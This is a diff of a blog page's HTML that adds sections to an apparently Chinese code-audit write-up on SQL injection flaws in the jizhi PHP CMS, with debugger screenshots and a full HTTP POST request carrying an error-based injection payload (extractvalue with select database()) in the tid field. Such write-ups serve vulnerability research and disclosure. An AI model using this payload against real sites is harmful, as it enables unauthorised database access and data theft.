@@ -74,7 +74,7 @@
     <div class="focusinfo no-select">
       <div class="header-tou">
         <a href="https://troyess.com">
-          <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/215153415.png">
+          <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1184384.jpg">
         </a>
       </div>
       <div class="header-info">
@@ -247,7 +247,38 @@
 <p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211022232046.png" alt></p>
 <p>最后报错信息通过\Home\c\ErrorController.php下进行输出。</p>
 <p>漏洞产生原因：一开始看到这个首页sql注入觉得很奇怪，跟了一遍才发现这个功能原本的目的是匹配页面内容（不知道咋形容），只是没有进行过滤，直接插入数据库执行，导致sql注入。</p>
+<h2 id="三、留言界面sql注入"><a href="#三、留言界面sql注入" class="headerlink" title="三、留言界面sql注入"></a>三、留言界面sql注入</h2><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023124605.png" alt></p>
+<p>下个断点跟一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023125050.png" alt></p>
+<p>赋值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023155924.png" alt></p>
+<p>关键在这里，我们的ip和留言的信息一起传入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023160150.png" alt></p>
+<p>最终执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023160703.png" alt></p>
+<h2 id="四、发布文章sql注入"><a href="#四、发布文章sql注入" class="headerlink" title="四、发布文章sql注入"></a>四、发布文章sql注入</h2><p>这个似乎是beta版本的洞</p>
+<p>beta：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023164533.png" alt></p>
+<p>正式版：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023164550.png" alt></p>
+<p>payload</p>
+<pre><code>POST /user/release.html HTTP/1.1
+Host: www.jizhi.com:1238
+Content-Length: 221
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://www.jizhi.com:1238
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://www.jizhi.com:1238/user/release.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,ko;q=0.8
+Cookie: PHPSESSID=216fp73bnjss25l5tnlqtb5bmt
+Connection: close
 
+id=&amp;isshow=&amp;molds=article&amp;tid=2&#39;and%20extractvalue(1,%20concat(0x5c,%20(select%20database()),0x5c))%20and%20%20&#39;1&#39;=&#39;1&amp;title=1&amp;keywords=1&amp;litpic=&amp;file_litpic=&amp;description=1&amp;submit=%E6%8F%90%E4%BA%A4&amp;body=%3Cp%3E1%3C%2Fp%3E
+</code></pre>
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
@@ -275,9 +306,26 @@
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/2021/10/26/GKCTF 2021/" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1184159.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1184159.jpg">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                GKCTF 2021</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
         
           
-            <div class="post-nepre full next">
+            <div class="post-nepre half next">
           
             <a href="/2021/10/21/2021祥云杯-Package-Manager-2021/" rel="next">
               <div class="background">
@@ -460,7 +508,7 @@ $(document).ready(function() {
   </section>
   <div id="mo-nav" class="">
   <div class="m-avatar">
-    <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/215153415.png">
+    <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1184384.jpg">
   </div>
   <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">YukinoTroy3e</p>
   <p style="text-align: center; word-spacing: 20px;">
